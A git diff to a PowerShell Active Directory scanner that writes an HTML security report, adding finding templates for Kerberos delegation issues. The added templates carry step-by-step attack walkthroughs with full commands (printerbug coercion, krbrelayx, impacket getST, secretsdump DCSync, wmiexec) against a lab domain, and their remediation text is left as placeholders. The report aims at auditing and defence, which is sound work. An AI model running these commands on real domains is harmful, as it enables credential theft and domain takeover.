@@ -239,6 +239,7 @@ function Invoke-ADScanner {
         $PKI += Find-ESC6 -Domain $Domain
         $PKI += Find-ESC7 -Domain $Domain
         $PKI += Find-ESC8 -Domain $Domain
+        $PKI = $PKI | Sort-Object -Property Score -Descending
     }
 
     $PKIhtml = Generate-PKIhtml -PKI $PKI
@@ -250,8 +251,9 @@ function Invoke-ADScanner {
         $Kerberos += Find-ASREProast -Domain $Domain
         $Kerberos += Find-Delegations -Domain $Domain
         $Kerberos += Find-GoldenTicket -Domain $Domain
+        $Kerberos = $Kerberos | Sort-Object -Property Score -Descending
     }
-    if(!$Kerberos){
+    if (!$Kerberos) {
         $Kerberoshtml = @"
         <div class="finding-header">Kerberos</div>
         <h2 class="novuln">No vulnerabilities found!</h2>
@@ -291,19 +293,19 @@ function Invoke-ADScanner {
                                     <tr>
 "@
                 # Different issue headings        
-                if($finding.Technique -eq "Highly privileged ASREP-roastable user with a weak password") {
+                if ($finding.Technique -eq "Highly privileged ASREP-roastable user with a weak password") {
                     $Kerberoshtml += "<td>Password hash of a highly privileged account can be obtained and cracked.</td>"
                 }
-                elseif($finding.Technique -eq "Highly privileged ASREP-roastable user with a strong password") {
+                elseif ($finding.Technique -eq "Highly privileged ASREP-roastable user with a strong password") {
                     $Kerberoshtml += "<td>Password hash of a highly privileged account can be obtained.</td>"
                 }
-                elseif($finding.Technique -eq "Low privileged ASREP-roastable user with a weak password") {
+                elseif ($finding.Technique -eq "Low privileged ASREP-roastable user with a weak password") {
                     $Kerberoshtml += "<td>Password hash of a low privileged account can be obtained and cracked.</td>"
                 }
-                elseif($finding.Technique -eq "Low privileged ASREP-roastable user with a strong password") {
+                elseif ($finding.Technique -eq "Low privileged ASREP-roastable user with a strong password") {
                     $Kerberoshtml += "<td>Password hash of a low privileged account can be obtained.</td>"
                 }
-                elseif($finding.Technique -eq "Disabled ASREP-roastable user") {
+                elseif ($finding.Technique -eq "Disabled ASREP-roastable user") {
                     $Kerberoshtml += "<td>Password hash of a disabled account can be obtained and cracked.</td>"
                 }
                 $Kerberoshtml += @"
@@ -323,18 +325,18 @@ function Invoke-ADScanner {
                                             <tr><td class="grey">Users</td><td>$($finding.Users)</td></tr>
 "@  
                 #If privileged match the groups
-                if($finding.Technique -match "Highly privileged") {
+                if ($finding.Technique -match "Highly privileged") {
                     $Kerberoshtml += @"
                     <tr><td class="grey">MemberOf</td><td>$($finding.Memberof)</td></tr>
 "@
-                } else{
-                    $Kerberoshtml += @"
+                } 
+                $Kerberoshtml += @"
                                         <tr><td class="grey">Enabled</td><td>$($finding.Enabled)</td></tr>
                                         <tr><td class="grey">DoNotRequireKerberosPreauthentication</td><td>True</td></tr>
                                         </table></td>
                                         <td class="explanation">
                                             <p>ASREP-roasting is a vulnerability where a user has the "Do not requrire Kerberos preauthentication" flag set within Active Directory. This means that when requesting a TGT from the KDC, the entire validation process of needing to present a timestamp encrypted with the user’s hashed password to validate that user is authorized to request the TGT is skipped. Therefore without even knowing the users password, it is possible to retrieve an encrypted TGT for the user in an AS-REP message.</p>
-                                            <p>This means for any user this flag is set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p> 
+                                            <p>This means for $($finding.NumUsers) users it is possible to retrieve the user's hashed password and attempt to crack it if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p> 
                                             <p class="links"><b>Further information:</b></p>
                                             <p><a href="https://trustmarque.com/resources/asreproasting/>">Link 1</a></p>
                                             <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">Link 2</a></p>
@@ -401,8 +403,7 @@ function Invoke-ADScanner {
                     </td>
                 </tr>
 "@
-                }
-            }
+            }    
             elseif ($finding.Technique -match "Kerberoastable") {
                 $nospaceid = $finding.Technique.Replace(" ", "-")
                 $Kerberoshtml += @"
@@ -423,19 +424,19 @@ function Invoke-ADScanner {
                                     <tr>
 "@
                 # Different issue headings        
-                if($finding.Technique -eq "Highly privileged Kerberoastable user with a weak password") {
+                if ($finding.Technique -eq "Highly privileged Kerberoastable user with a weak password") {
                     $Kerberoshtml += "<td>Password hash of a highly privileged account can be obtained and cracked.</td>"
                 }
-                elseif($finding.Technique -eq "Highly privileged Kerberoastable user with a strong password") {
+                elseif ($finding.Technique -eq "Highly privileged Kerberoastable user with a strong password") {
                     $Kerberoshtml += "<td>Password hash of a highly privileged account can be obtained.</td>"
                 }
-                elseif($finding.Technique -eq "Low privileged Kerberoastable user with a weak password") {
+                elseif ($finding.Technique -eq "Low privileged Kerberoastable user with a weak password") {
                     $Kerberoshtml += "<td>Password hash of a low privileged account can be obtained and cracked.</td>"
                 }
-                elseif($finding.Technique -eq "Low privileged Kerberoastable user with a strong password") {
+                elseif ($finding.Technique -eq "Low privileged Kerberoastable user with a strong password") {
                     $Kerberoshtml += "<td>Password hash of a low privileged account can be obtained.</td>"
                 }
-                elseif($finding.Technique -eq "Disabled Kerberoastable user") {
+                elseif ($finding.Technique -eq "Disabled Kerberoastable user") {
                     $Kerberoshtml += "<td>Password hash of a disabled account can be obtained and cracked.</td>"
                 }
                 $Kerberoshtml += @"
@@ -456,17 +457,17 @@ function Invoke-ADScanner {
                                             <tr><td class="grey">SPN</td><td>$($finding.SPN)</td></tr>
 "@  
                 #If privileged match the groups
-                if($finding.Technique -match "Highly privileged") {
+                if ($finding.Technique -match "Highly privileged") {
                     $Kerberoshtml += @"
                     <tr><td class="grey">MemberOf</td><td>$($finding.Memberof)</td></tr>
 "@
-                } else{
-                    $Kerberoshtml += @"
+                }
+                $Kerberoshtml += @"
                                         <tr><td class="grey">Enabled</td><td>$($finding.Enabled)</td></tr>
                                         </table></td>
                                         <td class="explanation">
                                             <p>Kerberoasting-roasting is a vulnerability where an account has a Service Principal Name (SPN) set and a weak password within Active Directory. In Microsoft Windows, SPNs are simply unique identifiers of service accounts. By design, to access the service run by the account, domain users request tickets (TGS) for that service using Kerberos which are encrypted with the service account’s NTLM hash. This is possible by any domain user, regardless if they have permission to access the service or not. The TGS is encrypted with a hashed vesion of the account's password, which can be retrieved from the TGS./p>
-                                            <p>This means for any user with an SPN set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p> 
+                                            <p>This means for $($finding.NumUsers) users with an SPN set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p> 
                                             <p class="links"><b>Further information:</b></p>
                                             <p><a href="https://attack.mitre.org/techniques/T1558/003/>">Link 1</a></p>
                                             <p><a href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Link 2</a></p>
@@ -533,21 +534,332 @@ function Invoke-ADScanner {
                     </td>
                 </tr>
 "@
-                }
             }
+        
             elseif ($finding.Technique -eq "Unconstrained delegation") {
                 $nospaceid = $finding.Technique.Replace(" ", "-")
-                
+                $Kerberoshtml += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>A server that is set for unconstrained delegation can compromise the entire domain.</td>
+                                        <td>T1558.001</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">Object</td><td>$($finding.Object)</td></tr>
+                                            <tr><td class="grey">TrustedForDelegation</td><td>$($finding.TrustedForDelegation)</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>Servers with unconstrained delegation configured cache user's tickets when they authenticate to the frontend service, in order to delegate on behalf of the user to another backend service. This is dangerous if a high privleged user or a domain controller (a connection can be forced using the spooler service) then the domain can be compromised.</p>
+                                            <p>If computers with unconstrained delegation are compromised, full domain compromise is achievable by coercing authentication from a domain controller, who's ticket will be then be cached and can be extracted on the computer facilatating impersonation of a domain controller.</p> 
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://blog.netwrix.com/2022/12/02/unconstrained-delegation/">Link 1</a></p>
+                                            <p><a href="https://pentestlab.blog/2022/03/21/unconstrained-delegation/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. Any low-privileged user can find which servers are configured for unconstrained delegation using netexec. Domain controllers are configured for unconstrained delegation by default and can be excluded.</p>
+                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123' --trusted-for-delegation</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-1.png" alt="Finding unconstrained delegation">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. For the purpose of this attack it's assumed the server configured for unconstrained delegation has been compromised, and credential memory dumped.</p>
+                                                    <p class="code">impacket-secretsdump Administrator:'Password123!'@dc.test.local -just-dc-user 'unconstrained$'</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-2.png" alt="Compromise of unconstrained delegation server">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>3. With unconstrained$ already compromised, it can update its SPN to point to a service running on an attacker machine "attacker.test.local". This is doen so when a DC authenticates to the unconstrained$ service it will be tricked to send the ticket to the attacker machine.</p>
+                                                    <p class="code">python3 addspn.py -u test.local\\unconstrained\$ -p aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72 -s HOST/attacker.test.local dc.test.local --additional dc.test.local</p>
+                                                    <p>A DNS record can be added by any low-privileged account to the domain, so one is added to point the SPN to the IP of the attacker kali machine which will update every 180 seconds.</p>
+                                                    <p class="code">python3 dnstool.py -u test.local\\unconstrained\$ -p aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72 -r attacker.test.local -d 192.168.10.130 --action add dc.test.local</p>
+                                                    </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-3.png" alt="Adding SPN & dns record">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>4. Authentication can be coerced from the domain controller to the attacker machine using printerbug.</p>
+                                                    <p class="code">python3 printerbug.py test:'Password123!'@dc.test.local attacker.test.local</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-4.png" alt="Coercing authentication">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>5. A kerberos listener is started to collect, decrypt and save the cached TGS of the domain controller intercepted from the coerced authentication.</p>
+                                                    <p class="code">python3 krbrelayx.py -hashes aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72</p>
+
+                                                    <p>Finally, with the ticket of the domain controller obtained, a DCSync can be performed to extract all user credentials to fully compromise the domain.</p>
+                                                    <p class="code">export KRB5CCNAME=DC\$@TEST.LOCAL_krbtgt@TEST.LOCAL.ccache</p>
+                                                    <p class="code">impacket-secretsdump -k -no-pass dc.test.local</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/Kerberos/unconstrained-5.png" alt="Exploiting unconstrained">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>Unconstrained remediation</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@ 
 
             }
             elseif ($finding.Technique -eq "Constrained delegation") {
                 $nospaceid = $finding.Technique.Replace(" ", "-")
-                
-
+                $Kerberoshtml += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>A server has full control of another server by being allowed to delegate to it (msDS-AllowedToDelegateTo).</td>
+                                        <td>T1558.001</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">Object</td><td>$($finding.Object)</td></tr>
+                                            <tr><td class="grey">AllowedToDelegateTo</td><td>$($finding.AllowedToDelegateTo)</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>Constrained delegation allows a computer to delegate to specific services on another server. Constrained delegation is configured on the computer or user object. It is set through the msds-allowedtodelegateto property by specifying the SPN the current object is allowed constrained delegation against.</p>
+                                            <p>If computers with constrained delegation are compromised, full compromise of the server it has permission to delegate to is achievable by proxy.</p> 
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://blog.netwrix.com/2023/04/21/attacking-constrained-delegation-to-elevate-access/">Link 1</a></p>
+                                            <p><a href="https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. Any low-privileged user can find which servers are configured for constrained delegation by searching for servers with the 'msDS-AllowedToDelegateTo' property populated.</p>
+                                                    <p class="code">impacket-findDelegation -target-domain test.local test.local/test:'Password123!'</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/Kerberos/constrained-1.png" alt="Finding constrained delegation">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. If the frontend service is compromised (DESKTOP-JKTS35O$), an adversary can request a ticket for any service on the backend (CA$).</p>
+                                                    <p class="code">impacket-getST -dc-ip dc.test.local -spn cifs/CA.test.local -impersonate administrator test.local/'DESKTOP-JKTS35O$' -hashes :511e061a15068d1cbda8dfc4cc22a2f3</p>
+                                                    <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service..</p>
+                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
+                                                    <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
+                                                    </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/Kerberos/constrained-2.png" alt="exploiting constrained delegation">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>Constrained remediation</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@ 
             }
             elseif ($finding.Technique -eq "Resource-based constrained delegation") {
                 $nospaceid = $finding.Technique.Replace(" ", "-")
-                
+                $Kerberoshtml += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>A server has full control of another server by being allowed to act on behalf of it (msDS-AllowedToActOnBehalfOfOtherIdentity).</td>
+                                        <td>T1558.001</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">Object</td><td>$($finding.Object)</td></tr>
+                                            <tr><td class="grey">msDS-AllowedToActOnBehalfOfOtherIdentity</td><td>$($finding.'msDS-AllowedToActOnBehalfOfOtherIdentity')</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>Resource-based constrained delelgation (RBCD) was introduced in Windows server 2012 and is where a server permits delegation from a frontend service to a backend service. This is configured on the backend service via the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property. This type of delegation was seen as more secure than unconstrained or constrained, however if the frontend service is compromised, the backend service will also be by proxy.</p>
+                                            <p>$($finding.'msDS-AllowedToActOnBehalfOfOtherIdentity') can delegate to any resource on $($finding.object) permitting lateral movement between the two.</p> 
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://redfoxsec.com/blog/rbcd-resource-based-constrained-delegation-abuse/">Link 1</a></p>
+                                            <p><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. Any low-privileged user can find which servers are configured for RBCD by searching for those with the msDS-AllowedToActOnBehalfOfOtherIdentity property populated.</p>
+                                                    <p class="code">Get-ADComputer 'CA' -Properties PrincipalsAllowedToDelegateToAccount</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/Kerberos/RBCD-1.png" alt="Finding RBCD">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. If the frontend service is compromised (RBCD$), an adversary can request a ticket for any service on the backend (CA$).</p>
+                                                    <p class="code">impacket-getST -dc-ip dc.test.local -spn cifs/CA.test.local -impersonate administrator test.local/'RBCD$' -hashes :88d61b9ad3988a5bb86ca8ba9386d736</p>
+                                                    <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service.</p>
+                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
+                                                    <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/Kerberos/RBCD-2.png" alt="Exploiting RBCD">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>RBCD remediation</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@ 
 
             }
             elseif ($finding.Technique -match "Golden ticket attack") {
@@ -610,8 +922,7 @@ function Invoke-ADScanner {
                                                     <p class="code">impacket-lookupsid test.local/test:'Password123!'@dc.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/goldenticket-1.png"
-                                                        alt="Obtaining the krbtgt hash">
+                                                    <img src="/Private/Report/Images/Kerberos/goldenticket-1.png" alt="Obtaining the krbtgt hash">
                                                 </span>
                                             </div>
                                             <hr>
@@ -624,8 +935,7 @@ function Invoke-ADScanner {
                                                     <p class="code">klist</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Kerberos/goldenticket-2.png"
-                                                        alt="Forging a golden ticket">
+                                                    <img src="/Private/Report/Images/Kerberos/goldenticket-2.png" alt="Forging a golden ticket">
                                                 </span>
                                             </div>
                                         </td>
@@ -653,10 +963,8 @@ function Invoke-ADScanner {
 
             }
         }
+        $Kerberoshtml += "</tbody></table></div>"
     }
-
-
-
 
 
 
@@ -673,12 +981,13 @@ function Invoke-ADScanner {
     if ($Scans -eq "ACLs" -or $Scans -eq "All") {
         $ACLs += Find-ACLs -Domain $Domain
     }
-    if(!$ACLs){
+    if (!$ACLs) {
         $ACLshtml = @"
         <div class="finding-header">ACLs</div>
         <h2 class="novuln">No vulnerabilities found!</h2>
 "@
-    } else{
+    }
+    else {
         $ACLshtml = @"
         <div class="finding-header">ACLs</div>
 "@
@@ -693,12 +1002,13 @@ function Invoke-ADScanner {
         $RBAC += Find-AnonymousAccess -Domain $Domain
         $RBAC += Find-SensitiveAccounts -Domain $Domain
     }
-    if(!$RBAC){
+    if (!$RBAC) {
         $RBAChtml = @"
         <div class="finding-header">RBAC</div>
         <h2 class="novuln">No vulnerabilities found!</h2>
 "@
-    } else{
+    }
+    else {
         $RBAChtml = @"
         <div class="finding-header">RBAC</div>
 "@
@@ -713,12 +1023,13 @@ function Invoke-ADScanner {
         $Passwords += Find-SensitiveInfo -Domain $Domain
         #$Passwords += Find-UserDescriptions -Domain $Domain -APIKey $APIkey
     }
-    if(!$Passwords){
+    if (!$Passwords) {
         $Passwordshtml = @"
         <div class="finding-header">Passwords</div>
         <h2 class="novuln">No vulnerabilities found!</h2>
 "@
-    } else{
+    }
+    else {
         $Passwordshtml = @"
         <div class="finding-header">Passwords</div>
 "@
@@ -735,12 +1046,13 @@ function Invoke-ADScanner {
         $MISC += Find-WebDAV -Domain $Domain
         $MISC += Find-EfficiencyImprovements -Domain $Domain
     }
-    if(!$MISC){
+    if (!$MISC) {
         $MISChtml = @"
         <div class="finding-header">MISC</div>
         <h2 class="novuln">No vulnerabilities found!</h2>
 "@
-    } else{
+    }
+    else {
         $MISChtml = @"
         <div class="finding-header">MISC</div>
 "@
@@ -752,12 +1064,13 @@ function Invoke-ADScanner {
         $Legacy += Find-LegacyProtocols -Domain $Domain
         $Legacy += Find-UnsupportedOS -Domain $Domain
     }
-    if(!$Legacy){
+    if (!$Legacy) {
         $Legacyhtml = @"
         <div class="finding-header">Legacy</div>
         <h2 class="novuln">No vulnerabilities found!</h2>
 "@
-    } else{
+    }
+    else {
         $Legacyhtml = @"
         <div class="finding-header">Legacy</div>
 "@
@@ -855,32 +1168,37 @@ function Invoke-ADScanner {
         <div class="risk-overall">
         <div class="left-image"> 
 "@
-        if ($TotalDomainRiskScore -ge 100){
+        if ($TotalDomainRiskScore -ge 100) {
             $riskOverallHTML += @"  
             <img src="./Images/Risk-scores/Critical.png" alt="Overall risk score">
             </div>
 "@
-        } elseif ($TotalDomainRiskScore -ge 75) {
+        }
+        elseif ($TotalDomainRiskScore -ge 75) {
             $riskOverallHTML += @"
             <img src="./Images/Risk-scores/High.png" alt="Overall risk score">
             </div>
 "@
-        } elseif ($TotalDomainRiskScore -ge 50) {
+        }
+        elseif ($TotalDomainRiskScore -ge 50) {
             $riskOverallHTML += @"
             <img src="./Images/Risk-scores/Medium.png" alt="Overall risk score">
             </div>
 "@ 
-        } elseif ($TotalDomainRiskScore -ge 25) {
+        }
+        elseif ($TotalDomainRiskScore -ge 25) {
             $riskOverallHTML += @"
             <img src="./Images/Risk-scores/Low.png" alt="Overall risk score">
             </div>
 "@   
-        } elseif ($TotalDomainRiskScore -eq 1) {
+        }
+        elseif ($TotalDomainRiskScore -eq 1) {
             $riskOverallHTML += @"
             <img src="./Images/Risk-scores/Very-low.png" alt="Overall risk score">
             </div> 
 "@
-        } elseif ($TotalDomainRiskScore -eq 0) {
+        }
+        elseif ($TotalDomainRiskScore -eq 0) {
             $riskOverallHTML += @"
             <img src="./Images/Risk-scores/Perfect.png" alt="Overall risk score">
             </div> 
@@ -929,28 +1247,32 @@ function Invoke-ADScanner {
                     <td class="category-riskcritical">$score</td>
                 </tr>
 "@
-            } elseif ($score -ge 75) {
+            }
+            elseif ($score -ge 75) {
                 $categoryRisksHTML += @"
                 <tr>
                     <td>$($item.Name)</td>
                     <td class="category-riskhigh">$score</td>
                 </tr>
 "@
-            } elseif ($score -ge 50) {
+            }
+            elseif ($score -ge 50) {
                 $categoryRisksHTML += @"
                 <tr>
                     <td>$($item.Name)</td>
                     <td class="category-riskmedium">$score</td>
                 </tr>
 "@
-            } elseif ($score -ge 1) {
+            }
+            elseif ($score -ge 1) {
                 $categoryRisksHTML += @"
                 <tr>
                     <td>$($item.Name)</td>
                     <td class="category-risklow">$score</td>
                 </tr>
 "@          
-            } elseif ($score -eq 0) {
+            }
+            elseif ($score -eq 0) {
                 $categoryRisksHTML += @"
                 <tr>
                     <td>$($item.Name)</td>
@@ -1194,13 +1516,13 @@ function Invoke-ADScanner {
     #Generate-Report
 
 
-   # $htmlreportheader # banner and top heading
-   # $riskOverallHTML # domain risk level
-   # $runinfoHTML   # details when ran
-   # $categoryRisksHTML # category risk scores
-   # $executiveSummaryHTML # executive summary with GPT
-   # $RisksummaryHTMLoutput # risk prioritisation summary
-   # $DomainInfohtml # first bit of technical section
+    # $htmlreportheader # banner and top heading
+    # $riskOverallHTML # domain risk level
+    # $runinfoHTML   # details when ran
+    # $categoryRisksHTML # category risk scores
+    # $executiveSummaryHTML # executive summary with GPT
+    # $RisksummaryHTMLoutput # risk prioritisation summary
+    # $DomainInfohtml # first bit of technical section
 
     #Technical sections
     #$PKIhtml
